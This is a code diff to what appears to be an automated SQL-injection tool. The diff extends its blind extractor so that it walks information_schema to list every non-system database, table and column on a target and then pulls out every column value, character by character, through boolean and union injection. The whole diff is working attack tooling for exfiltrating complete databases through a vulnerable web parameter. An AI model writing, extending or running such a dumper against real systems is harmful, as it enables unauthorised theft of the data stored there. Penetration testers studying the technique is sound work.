@@ -1,21 +1,20 @@
-from core.Requester import Requester
-from core.Analyzer import Analyzer
 from injections.BooleanInjector import BooleanInjector
-from injections.ErrorInjector import ErrorInjector
 from injections.UnionInjector import UnionInjector
-from injections.TimeInjector import TimeInjector
 from utils.Logger import Logger
-from utils.constants import HEIGH_ELEMENT_COUNT, HEIGH_NAME_LENGTH, RESET, YELLOW, InjectionContext
+from utils.constants import (
+    HEIGH_ELEMENT_COUNT, HEIGH_ELEMENT_NAME_LENGTH, HEIGH_COL_VALUE_LENGTH,
+    RESET, YELLOW, InjectionContext
+)
 from re import findall
+from utils.print import string_to_sql_char
+from utils.parser import is_system_db
+
 
 class BlindExtractor:
 	def __init__(self,
-			# requester: Requester, analyzer: Analyzer,
 			boolean: BooleanInjector,
    			union: UnionInjector,
 		):
-		# self.requester = requester
-		# self.analyzer = analyzer
 		self.boolean = boolean
 		self.union = union
 
@@ -28,7 +27,7 @@ class BlindExtractor:
 
 	def find_db_elem_name(
 		self, url: str, param: str, ctx: InjectionContext,
-  		column_count: int, expression: str, union_expression: str
+  		column_count: int, db_elem: str, expression: str, union_expression: str
     ) -> str:
 		"""
 		Compute a database element's name
@@ -41,11 +40,12 @@ class BlindExtractor:
 
 		# Get the database element's name length
 		name_length_expression = f"LENGTH({expression})"
+		max_length = HEIGH_COL_VALUE_LENGTH if db_elem == "value" else HEIGH_ELEMENT_NAME_LENGTH
 		name_length = self.boolean.get_number_returned_by_sql(
-      		url, param, ctx, name_length_expression, HEIGH_NAME_LENGTH
+      		url, param, ctx, name_length_expression, max_length
         )
 
-		Logger.success(f"Found database element's name length: {YELLOW}{name_length}{RESET}")
+		Logger.debug(f"Found database element's name length: {YELLOW}{name_length}{RESET}")
 
 		# Better simply compute for each character if length is short
 		if name_length < 5:
@@ -99,14 +99,22 @@ class BlindExtractor:
 	def dump_db_elem_entries(
 		self, url: str, param: str, ctx: InjectionContext,
   		column_count: int, nulls: str, db_elem: str,
-    ) -> None:
+		select: str, frm: str, where: str
+    ) -> list[str]:
 		"""
 		Get the number of entries that the database element (table, column) has,
   		then create a loop in which each entry name is found by binary search.
+		All entry names are finally returned as a list.
   		"""
+		results = []
   
 		# Get the number of database element's entries on the database
-		db_elem_count_expression = f"(SELECT COUNT(*) FROM information_schema.{db_elem}s)"
+		db_elem_count_expression = (
+      		f"(SELECT COUNT(*) {frm} {where})"
+		)
+
+		Logger.info(db_elem_count_expression)
+
 		db_elem_count = self.boolean.get_number_returned_by_sql(
 			url, param, ctx, db_elem_count_expression, HEIGH_ELEMENT_COUNT
 		)
@@ -114,17 +122,84 @@ class BlindExtractor:
 
 		# Find name for each database element's entry
 		for elem in range(db_elem_count):
-			expression = f"(SELECT {db_elem}_name FROM information_schema.{db_elem}s LIMIT {elem},1)"
+			expression = (
+       			f"({select} {frm} {where} LIMIT {elem},1)"
+			)
 			# Limit is one further as it prints the first SELECT results at index 0
 			union_expression = f"""
-				SELECT {db_elem}_name,{nulls}
-				FROM information_schema.{db_elem}s
+				{select},{nulls}
+				{frm}
+				{where}
 				LIMIT {elem + 1},1
 			"""
 
 			db_elem_name = self.find_db_elem_name(
-				url, param, ctx, column_count,
+				url, param, ctx, column_count, db_elem,
 				expression, union_expression
 			)
 			if db_elem_name:
-				Logger.success(f"Found {db_elem} name: {YELLOW}{db_elem_name}{RESET}\n")
+				results.append(db_elem_name)
+				Logger.success(
+        			f"Found {db_elem} name #{elem + 1}: {YELLOW}{db_elem_name}{RESET}\n"
+           		)
+    
+		return results
+    
+	def dump_db_entries(
+		self, url: str, param: str, ctx: InjectionContext,
+  		column_count: int, nulls: str
+    ) -> dict:
+		"""Dump all databases"""
+
+		dump = {}
+  
+		db_names = self.dump_db_elem_entries(
+			url, param, ctx, column_count, nulls, "database",
+			f"SELECT schema_name",
+			f"FROM information_schema.schemata",
+			"",
+		)
+  
+		for i, db_name in enumerate(db_names):
+			if is_system_db(db_name):
+				Logger.info(f"Skipping system schema {db_name}...")
+			else:
+				Logger.success(
+					f"Found database name #{i + 1}: {YELLOW}{db_name}{RESET}\n"
+				)
+
+				sql_db_name = string_to_sql_char(db_name)
+				dump[db_name] = {}  # create an entry for the current database
+
+				# Get the table names of the current database
+				table_names = self.dump_db_elem_entries(
+					url, param, ctx, column_count, nulls, "table",
+					f"SELECT table_name",
+					f"FROM information_schema.tables",
+					f"WHERE table_schema = {sql_db_name}"
+				)
+				
+				# Get the column names of the current table
+				for table in table_names:
+					dump[db_name][table] = {}
+        
+					sql_table_name = string_to_sql_char(table)
+					column_names = self.dump_db_elem_entries(
+						url, param, ctx, column_count, nulls, "column",
+						f"SELECT column_name",
+						f"FROM information_schema.columns",
+						f"WHERE table_schema = {sql_db_name} AND table_name = {sql_table_name}"
+					)
+     
+					for col in column_names:
+						values = self.dump_db_elem_entries(
+							url, param, ctx, column_count, nulls, "value",
+							f"SELECT {col}",
+							f"FROM `{db_name}`.`{table}`",
+							f""
+						)
+				
+						dump[db_name][table][col] = values
+		return dump
+
+  
